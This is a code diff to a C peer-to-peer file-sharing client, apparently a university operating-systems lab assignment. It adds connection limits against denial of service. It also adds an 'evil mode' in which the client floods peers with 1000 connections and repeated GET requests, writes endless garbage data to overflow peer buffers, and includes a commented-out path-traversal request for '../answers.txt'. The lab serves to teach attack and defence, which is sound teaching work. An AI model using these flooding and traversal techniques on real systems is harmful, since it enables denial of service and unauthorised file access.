@@ -27,6 +27,9 @@
 
 int evil_mode;			// nonzero iff this peer should behave badly
 
+int numOpenConnections;		// number of connections open with other peers 
+#define MAXCONNECTIONS 1000	// max number of open connections at one time
+
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
 
@@ -42,9 +45,9 @@ static int listen_port;
 //#define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 
-// TASK 3: Fix Garbage File size for overflow attack
+// TASK 3: Garbage File size for overflow attack
 #define GARBAGE_SIZ 20480
-char* garbage[GARBAGE_SIZ+1];
+char garbage[GARBAGE_SIZ];
 
 
 typedef enum tasktype {		// Which type of connection is this?
@@ -116,7 +119,10 @@ static void task_pop_peer(task_t *t)
 	if (t) {
 		// Close the file descriptors and bounded buffer
 		if (t->peer_fd >= 0)
+		{
 			close(t->peer_fd);
+			numOpenConnections--;	// close a connection
+		}
 		if (t->disk_fd >= 0)
 			close(t->disk_fd);
 		t->peer_fd = t->disk_fd = -1;
@@ -253,7 +259,7 @@ int open_socket(struct in_addr addr, int port)
 		if (connect(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1)
 			goto error;
 	}
-
+	numOpenConnections++;	// add a connection	
 	return fd;
 
     error:
@@ -337,6 +343,9 @@ task_t *start_tracker(struct in_addr addr, int port)
 	task_t *tracker_task = task_new(TASK_TRACKER);
 	size_t messagepos;
 
+	if (numOpenConnections > MAXCONNECTIONS) // prevent DOS from too many requests
+		die("too many connections");	
+
 	if ((tracker_task->peer_fd = open_socket(addr, port)) == -1)
 		die("cannot connect to tracker");
 
@@ -367,6 +376,9 @@ task_t *start_listen(void)
 	task_t *t;
 	int fd;
 	addr.s_addr = INADDR_ANY;
+
+        if (numOpenConnections > MAXCONNECTIONS) // prevent DOS from too many requests
+                die("too many connections"); 
 
 	// Set up the socket to accept any connection.  The port here is
 	// ephemeral (we can use any port number), so start at port
@@ -413,7 +425,7 @@ static void register_files(task_t *tracker_task, const char *myalias)
 		message("* The tracker reported an error, so I will not register files with it.\n");
 		return;
 	}
-
+	
 	// Register files with the tracker.
 	message("* Registering our files with tracker\n");
 	if ((dir = opendir(".")) == NULL)
@@ -504,6 +516,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 }
 
 
+
 // task_download(t, tracker_task)
 //	Downloads the file specified by the input task 't' into the current
 //	directory.  't' was created by start_download().
@@ -529,6 +542,10 @@ static void task_download(task_t *t, task_t *tracker_task)
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
+
+        if (numOpenConnections > MAXCONNECTIONS) // prevent DOS from too many requests
+                die("too many connections");
+
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 	if (t->peer_fd == -1) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
@@ -579,7 +596,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 			goto try_again;
 		}
 	}
-
 	// Empty files are usually a symptom of some error.
 	if (t->total_written > 0) {
 		message("* Downloaded '%s' was %lu bytes long\n",
@@ -605,6 +621,80 @@ static void task_download(task_t *t, task_t *tracker_task)
 }
 
 
+// TASK 3: Download attack
+// task_evil_download(t, tracker_task)
+//       Downloads the file specified by the input task 't' into the current
+//       directory.  't' was created by start_download().
+//       Starts with the first peer on 't's peer list, then tries all peers
+//       until a download is successful.
+static void task_evil_download(task_t *t, task_t *tracker_task)
+{
+        int i, ret = -1;
+        assert((!t || t->type == TASK_DOWNLOAD)
+               && tracker_task->type == TASK_TRACKER);
+
+        // Quit if no peers, and skip this peer
+        if (!t || !t->peer_list) {
+                error("* No peers to be the victim for '%s'\n",
+                      (t ? t->filename : "that file"));
+                task_free(t);
+                return;
+        } else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+                   && t->peer_list->port == listen_port)
+                goto try_again_evil;
+
+        // Connect to the peer and write the GET command
+        message("* Connecting to %s:%d to pretend to download '%s\n",
+                inet_ntoa(t->peer_list->addr), t->peer_list->port,
+                t->filename);
+        t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+        if (t->peer_fd == -1) {
+                error("* Cannot connect to peer: %s\n", strerror(errno));
+                goto try_again_evil;
+        }
+
+	// TASK 3: Attempt to download files outside their directory
+        // osp2p_writef(t->peer_fd, "GET ../answers.txt OSP2P\n");
+
+		
+	// TASK 3: Spam the peer with connections and requests for the same file
+	// but don't actually try to download it
+	int connection_spam[1000];
+	int j = 0;
+	for (; j < 1000; j++)
+	{
+		connection_spam[j] = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (connection_spam[j] == -1)
+		{
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+                	goto try_again_evil;	
+		}
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
+	
+        // Read the file into the task buffer from the peer,
+        // and write it from the task buffer onto disk.
+        while (1) {
+                int ret = read_to_taskbuf(t->peer_fd, t);
+                if (ret == TBUF_ERROR) {
+                        error("* Peer read error");
+                        goto try_again_evil;
+                } else if (ret == TBUF_END && t->head == t->tail)
+                        /* End of file */
+                        break;
+        }
+	
+    try_again_evil:
+        if (t->disk_filename[0])
+                unlink(t->disk_filename);
+        // recursive call
+        task_pop_peer(t);
+        task_evil_download(t, tracker_task);
+}       
+
+
+
+ 
 // task_listen(listen_task)
 //	Accepts a connection from some other peer.
 //	Returns a TASK_UPLOAD task for the new connection.
@@ -674,8 +764,8 @@ static void task_upload(task_t *t)
 	message("* Transferring file %s\n", t->filename);
 	if (evil_mode > 0) 
 	{
-		// JOSH: overflow peer buffer with garbage data
-		while(1)
+		// JOSH: TASK 3: overflow peer buffer with garbage data
+		while (1)
 		{
 			write(t->peer_fd, &garbage[0], GARBAGE_SIZ);
 		}
@@ -716,7 +806,7 @@ int main(int argc, char *argv[])
 	char *s;
 	const char *myalias;
 	struct passwd *pwent;
-
+	numOpenConnections = 0;		// currently no connections open yet
 	
 	// Default tracker is read.cs.ucla.edu
 	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
@@ -790,7 +880,7 @@ int main(int argc, char *argv[])
 		memset(garbage, '!', GARBAGE_SIZ);	
 	
 	}
-// TASK 1: PARALLELIZE DOWNLOAD
+	// TASK 1: PARALLELIZE DOWNLOAD
 	// First, download files named on command line.
 	int childCount = 0;
 	for (; argc > 1; argc--, argv++) {
@@ -804,8 +894,16 @@ int main(int argc, char *argv[])
 			}
 			if (pid == 0)
 			{
-				task_download(t, tracker_task);
-				_exit(0);
+				if (evil_mode > 0)
+				{
+					task_evil_download(t, tracker_task);
+					_exit(0);
+				}
+				else
+				{
+					task_download(t, tracker_task);
+					_exit(0);
+				}
 			}
 			if (pid > 0)
 			{
@@ -818,7 +916,6 @@ int main(int argc, char *argv[])
 	while (childCount-- > 0) {
 		waitpid(-1, NULL, 0);
 	}
-
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task))) {
 		pid_t pid;
